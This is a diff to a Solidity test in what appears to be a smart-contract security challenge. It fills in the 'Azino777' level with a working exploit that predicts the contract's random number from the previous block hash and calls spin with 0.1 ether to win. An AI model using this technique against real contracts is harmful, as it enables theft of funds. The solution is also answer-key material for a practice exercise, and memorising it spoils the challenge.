@@ -15,8 +15,13 @@ contract Azino777Test is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        uint256 max = 100;
+        uint256 max_factor = type(uint256).max / max;
+        uint256 lastNumber = block.number -1;
+        uint256 hashVal = uint256(blockhash(lastNumber));
+        uint256 result = (hashVal / max_factor) % max;
 
+        instance.spin{value: 0.1 ether}(result);
         checkSuccess();
     }
 
